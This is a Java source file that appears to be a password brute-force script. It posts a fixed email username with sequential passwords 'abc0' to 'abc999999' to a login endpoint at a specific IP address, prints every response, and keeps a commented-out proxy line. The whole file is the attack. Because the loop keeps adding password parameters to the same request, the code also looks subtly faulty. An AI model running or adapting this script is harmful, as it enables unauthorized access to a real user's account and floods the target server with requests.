package com.gray.test;

import java.io.IOException;

import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.HttpException;
import org.apache.commons.httpclient.methods.PostMethod;

public class Test implements Runnable {

    public static void main(String[] args) {
        for (int i = 0; i < 1; i++) {
            Test t = new Test();
            Thread th = new Thread(t);
            th.start();
        }
    }

    public void run() {
        HttpClient client = new HttpClient();
        // client.getHostConfiguration().setProxy("125.253.101.44", 8080);
        PostMethod post = new PostMethod(
                "http://119.254.109.162/base/userinfo/dologin.json");
        post.addParameter("username", "zzzkk@163.com");

        // GetMethod getMethod = new GetMethod(
        // "http://119.254.109.162/adapter/goodscategory/getBySearchVO.json?start=0&size=-1&sortBy=id&sortOrder=asc&q=&ids=&flag=1&id=5");
        for (int i = 0; i < 1000000; i++) {
            try {
                post.addParameter("password", "abc" + i);
                client.executeMethod(post);
                System.out.println(post.getResponseBodyAsString());
            }
            catch (HttpException e) {
                e.printStackTrace();
            }
            catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
